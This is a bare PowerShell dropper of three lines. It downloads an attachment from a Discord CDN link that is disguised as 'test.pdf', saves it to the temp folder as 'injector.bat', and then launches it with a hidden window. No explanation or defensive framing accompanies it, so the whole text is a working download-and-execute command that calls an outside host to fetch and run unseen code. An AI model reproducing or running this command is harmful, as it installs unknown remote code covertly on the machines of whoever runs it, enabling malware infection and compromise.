iwr -useb https://cdn.discordapp.com/attachments/1137771634808332378/1186359613998759936/test.pdf -o $env:TEMP\injector.bat
Start-Sleep -s 1
saps $env:TEMP\injector.bat -WindowStyle Hidden
